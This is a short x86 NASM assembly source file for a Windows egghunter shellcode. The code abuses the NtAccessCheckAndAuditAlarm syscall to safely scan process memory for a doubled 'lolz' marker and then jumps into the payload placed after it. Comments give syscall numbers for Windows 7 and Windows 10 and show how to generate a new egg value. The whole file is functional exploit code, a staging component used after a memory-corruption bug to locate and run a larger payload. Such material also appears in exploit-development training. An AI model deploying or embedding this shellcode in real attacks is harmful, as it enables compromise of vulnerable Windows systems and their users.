; position independent non-NULL egghunter shellcode using NtAccessCheckAndAuditAlarm() - 32 to 35 bytes
; 
; NOTE system call numbers are not constant! get number for your target: 
;      https://j00ru.vexillium.org/syscalls/nt/32/
;
; NOTE example to generate new egg value as 'lolz': 
;      python3 -c "print('0x'+'lolz'.encode()[::-1].hex())"  
BITS 32
section .text
global _start


; NOTE: We do not care what is in edx before the execution of this egghunter.
;       We will incriment edx with overflow/wraparound until we find the egg.
_start:
  or    dx, 0x0fff         ; add (PAGE_SIZE - 1) to edx
check_next_address:
  inc   edx                ; increment the test pointer by one
  push  edx                ; save current edx since syscalls do not preserve registers
  ; NOTE: currently set for Windows 7 and below
  push  0x2                ; push NtAccessCheckAndAuditAlarm system call number
  pop   eax                ; pop into eax 
  ; NOTE: example for Windows 10 - build 1709 to 1909
  ; xor   eax, eax           ; NULL eax
  ; add   ax, 0x1c6          ; set NtAccessCheckAndAuditAlarm system call number
  int   0x2e               ; perform the syscall
  cmp   al, 0x05           ; did we get 0xc0000005 (ACCESS_VIOLATION) ?
  pop   edx                ; restore edx
  je    _start             ; invalid ptr? go to the next page
  ; NOTE: egg currently set to 'lolz'
  mov   eax, 0x7a6c6f6c    ; set egg flag in eax 
  mov   edi, edx           ; set edi to the pointer we validated
  scasd                    ; compare the dword in edi to eax
  jnz   check_next_address ; no match? increment the pointer by one and try again
  scasd                    ; compare the dword in edi to eax again (which is now edx + 4)
  jnz   check_next_address ; no match? increment the pointer by one and try again
  jmp   edi                ; found the egg. jump 8 bytes past it into our code.
